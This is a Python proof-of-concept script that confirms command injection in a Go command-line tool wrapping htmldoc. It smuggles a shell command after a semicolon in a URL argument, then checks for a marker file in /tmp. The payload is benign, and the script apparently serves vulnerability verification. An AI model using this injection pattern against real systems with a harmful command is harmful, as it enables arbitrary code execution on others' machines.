#!/usr/bin/env python3
"""PoC: Command Injection in htmldoc Go CLI — Demonstrates arbitrary command execution via unsanitized URL input passed to sh -c."""
import json
import subprocess, sys, os, shutil

PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))
MARKER_FILE = "/tmp/pwned_marker.txt"

def log(status: str, msg: str, **extra):
    """Emit a structured JSON log line. status: info|success|warning|error|confirmed|failed"""
    line = json.dumps({"status": status, "message": msg, **extra})
    print(line, flush=True, file=sys.stderr if status == "error" else sys.stdout)

def setup():
    """Verify real htmldoc is installed and clean up any previous marker file."""
    if not shutil.which("htmldoc"):
        raise EnvironmentError("htmldoc not found in PATH — install it first")

    if os.path.exists(MARKER_FILE):
        os.remove(MARKER_FILE)

def exploit():
    """Execute the attack by running the Go CLI with a command injection payload."""
    # The payload injects a command that creates a marker file.
    # Using ; to terminate the htmldoc command and run our injected command.
    payload = "https://example.com; echo 'INJECTION_SUCCESSFUL' > " + MARKER_FILE

    log("info", "Running Go CLI with injection payload", payload=payload)

    result = subprocess.run(
        ["go", "run", ".", payload],
        cwd=PROJECT_DIR,
        capture_output=True,
        text=True,
        timeout=60,
    )

    return {
        "returncode": result.returncode,
        "stdout": result.stdout,
        "stderr": result.stderr,
        "marker_file": MARKER_FILE,
        "payload": payload,
    }

def validate(result) -> bool:
    """Check that the marker file was created by the injected command."""
    marker_file = result.get("marker_file", MARKER_FILE)

    if os.path.exists(marker_file):
        try:
            with open(marker_file, "r") as f:
                content = f.read().strip()

            if "INJECTION_SUCCESSFUL" in content:
                log("success", "Marker file created by injected command", content=content)
                return True
        except Exception as e:
            log("error", f"Failed to read marker file: {e}")
            return False

    log("warning", "Marker file not found - injection may have failed")
    return False

def cleanup():
    """Remove the marker file."""
    try:
        if os.path.exists(MARKER_FILE):
            os.remove(MARKER_FILE)
            log("info", "Removed marker file")
    except Exception:
        pass

if __name__ == "__main__":
    try:
        setup()
        result = exploit()
        confirmed = validate(result)
    except Exception as e:
        log("error", f"Execution failed: {e}")
        confirmed = False
    finally:
        cleanup()

    if confirmed:
        log("confirmed", "VULNERABILITY CONFIRMED")
        sys.exit(0)
    else:
        log("failed", "VULNERABILITY NOT CONFIRMED")
        sys.exit(1)
